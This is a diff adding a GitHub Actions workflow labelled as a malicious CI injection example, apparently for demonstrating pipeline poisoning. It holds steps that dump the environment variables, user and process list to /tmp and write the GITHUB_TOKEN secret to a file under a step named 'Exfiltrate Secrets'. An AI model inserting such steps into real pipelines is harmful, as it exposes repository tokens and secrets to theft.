@@ -1,0 +1,36 @@
+name: Poisoned CI Pipeline
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - uses: actions/checkout@v3
+    
+    - name: Set up Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.9'
+    
+    # MALICIOUS INJECTION EXAMPLE
+    - name: System Information Gathering
+      run: |
+        echo "Gathering system information..."
+        whoami > /tmp/user_info.txt
+        env > /tmp/env_vars.txt
+        ps aux > /tmp/processes.txt
+        
+    - name: Exfiltrate Secrets
+      run: |
+        echo "Checking environment..."
+        echo "GitHub Token: ${{ secrets.GITHUB_TOKEN }}" > /tmp/secrets.txt
+        echo "Runner: $RUNNER_OS" >> /tmp/secrets.txt
+        
+    - name: Run tests
+      run: python tests/test_app.py
